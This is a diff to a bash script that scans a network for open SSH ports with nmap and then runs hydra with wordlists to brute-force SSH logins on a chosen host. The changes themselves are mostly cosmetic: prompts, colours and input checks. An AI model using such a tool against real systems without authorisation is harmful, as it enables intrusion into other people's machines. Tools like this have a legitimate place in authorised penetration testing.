@@ -5,6 +5,7 @@ bReverse="\e[7;1m"
 title="\e[3;33m"
 red="\033[1;31m"
 green="\033[1;32m"
+purple="\033[0;35m"
 
 #---------------------------------User select the interface------------------------------
 ans="n"
@@ -38,7 +39,7 @@ lastVersionDate=$(date -r result/scanNetwork/scanSSH "+%D")
 if [ $? -eq 0 ]; then
 	#if the file has been created more than an hour ago
 	if [ $((`date +%s`-`date -r result/scanNetwork/scanSSH +%s`)) -gt 3600 ]; then
-		echo "too old"
+		clear
 		rm result/scanNetwork/scanSSH 2> /dev/null
 		nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
 	else
@@ -50,13 +51,13 @@ if [ $? -eq 0 ]; then
 			echo -e $green"ok, let's go ahead!"$transparent
 			sleep 1
 		else
-			echo "nope"
+			clear
 			rm result/scanNetwork/scanSSH 2> /dev/null
 			nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
 		fi
 	fi
 else
-	echo "nothing exist"
+	clear
 	nmap -p 22 $networkC -oG result/scanNetwork/scanSSH --open
 fi
 
@@ -81,14 +82,14 @@ fi
 while [ $ans != "y" ]
 do
 	clear
-	echo -e $title"Select a target"$transparent
+	echo -e $title"Select a target :"$transparent
 	if [  ${statesArray[i]} = "open" ]; then
 		colorS=$green
 	else
 		colorS=$red
 	fi
 
-	echo -e $bReverse""${hostnamesArray[i]}" "$transparent"state: "$colorS" "${statesArray[i]}$transparent
+	echo -e $bReverse"-"${hostnamesArray[i]}"-"$transparent"state: "$colorS" "${statesArray[i]}$transparent
 	echo "|-> adress "${addressArray[i]}
 
 	for j in `seq $(($i+1)) $nDisplay`;
@@ -117,10 +118,10 @@ username=""
 password=""
 bool="0"
 clear
-echo "If you know the username press y"
-echo -e "If you$red don't know$transparent the username press n"
+echo -e "If you$red don't know$transparent the username press y/n"$transparent
+echo -e "else press another key to enter the username"
 read ans
-if [ $ans = "n" ]; then
+if [ $ans == "n" ] || [ $ans == "y" ]; then
 	dicoArray=($(ls conf/dico))
 	if [ ${#dicoArray[@]} -gt 8 ]; then
 		nDisplay=4
@@ -165,11 +166,11 @@ else
 fi
 
 clear
-echo "If you know the password press y"
-echo -e "If you$red don't know$transparent the password press n"
+echo -e "If you$red don't know$transparent the password press y/n"
+echo -e "else press another key to enter the password"
 read ans
 echo $ans
-if [ $ans = "n" ] ; then
+if [ $ans == "n" ] || [ $ans == "y" ] ; then
 	dicoArray=($(ls conf/dico))
 	if [ ${#dicoArray[@]} -gt 8 ]; then
 		nDisplay=4
@@ -219,6 +220,6 @@ hydra ${addressArray[i]} ssh -vV $username $password -e s -t 10 -I -F -o "result
 #	sed -i '1d' "conf/dico/${dicoArray[k]}"
 #fi
 ##
-echo -e $title"result saved in result/scanNetwork/pass_hostname"$transparent
-echo -e $green"press a button to  quit"$transparent
+echo -e $green"result saved in result/scanNetwork/pass_hostname"$transparent
+echo -e $title"press a button to  quit"$transparent
 read tmp
